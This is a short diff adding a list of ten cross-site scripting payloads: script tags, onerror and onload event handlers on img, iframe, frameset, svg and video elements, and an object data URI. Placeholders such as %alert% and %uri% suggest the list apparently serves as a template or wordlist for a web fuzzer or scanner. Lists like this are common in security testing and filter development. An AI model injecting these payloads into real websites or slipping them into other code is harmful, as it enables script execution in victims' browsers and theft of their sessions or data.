@@ -1,0 +1,10 @@
+<script src=data:,%alert%></script>
+<script>/**///**/alert(1)</script>
+<img src=xx:x onerror=%alert% />
+<iframe onload=%alert%></iframe>
+<frameset onload=%alert%>
+<object data=%uri%>
+<svg onload=javascript:alert(2)//
+<video onerror=%uri%><source>
+<svg><script>%alert%</script>
+<svg onload=%uri%>
